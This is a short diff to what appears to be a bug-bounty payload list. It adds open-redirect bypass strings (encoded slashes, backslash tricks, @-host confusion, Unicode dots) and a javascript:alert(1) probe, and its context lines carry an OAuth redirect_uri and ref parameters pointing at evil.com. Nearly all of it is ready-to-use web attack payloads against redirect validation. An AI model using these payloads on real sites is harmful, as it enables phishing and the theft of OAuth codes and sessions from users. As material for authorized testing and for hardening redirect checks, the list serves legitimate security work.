@@ -31,3 +31,23 @@ redirect_uri=https://target.com/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com
 ref=https://evil.com
 response_type=code&
 {"redirect_url": "https://target.com/dashboard?ref=USER_CONTROLLED_VALUE"}
+# ─── open-redirect payloads (page 64 of bounty_tips_100) ───
+%09/google.com
+%5cgoogle.com
+//www.google.com/%2f%2e%2e
+//www.google.com/%2e%2e
+//google.com/
+//google.com/%2f..
+//\google.com
+/\victim.com:80%40google.com
+/\/google.com
+//;@google.com/
+//google.com/./
+///google.com
+////google.com
+//google%E3%80%82com
+# Path-based (server splits on / and takes the last one)
+https://target.com/redirect?url=//google.com
+https://target.com/redirect?url=@google.com
+https://target.com/redirect?url=google.com%2f@target.com
+https://target.com/redirect?url=javascript:alert(1)
